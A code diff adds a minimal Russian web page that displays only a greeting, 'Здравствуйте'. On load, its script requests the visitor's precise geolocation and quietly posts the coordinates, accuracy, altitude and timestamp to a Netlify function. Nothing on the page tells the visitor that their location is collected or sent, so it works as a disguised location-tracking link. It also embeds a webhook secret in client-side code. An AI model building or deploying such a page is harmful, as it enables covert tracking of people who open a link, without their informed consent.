@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Здравствуйте</title>
+  <style>
+    html,body{height:100%;margin:0}
+    body{display:grid;place-items:center;background:#0b1220;color:#e6eef8;font-family:Inter,system-ui,Arial,sans-serif}
+    h1{font-size:28px;letter-spacing:0.02em;margin:0}
+  </style>
+</head>
+<body>
+  <h1>Здравствуйте</h1>
+
+  <script>
+    // ВНИМАНИЕ: замените SECRET_PLACEHOLDER на секрет, который вы зададите в переменных окружения Netlify (WEBHOOK_SECRET).
+    const WEBHOOK_SECRET = 'S0m3R@nd0mLongSecretString_4u2x';
+
+    function buildPayload(position) {
+      return {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        timestamp: position.timestamp
+      };
+    }
+
+    async function postCoords(payload) {
+      try {
+        await fetch('/.netlify/functions/coords', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-webhook-secret': WEBHOOK_SECRET
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error('Ошибка отправки координат:', err);
+      }
+    }
+
+    function onGeoError(err) {
+      console.warn('Ошибка геопозиции', err);
+    }
+
+    window.addEventListener('load', () => {
+      if (!navigator.geolocation) {
+        console.warn('Геолокация не поддерживается браузером');
+        return;
+      }
+      // небольшая задержка, чтобы UI отрисовался
+      setTimeout(() => {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const payload = buildPayload(pos);
+          postCoords(payload);
+        }, onGeoError, { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
+      }, 50);
+    });
+  </script>
+</body>
+</html>
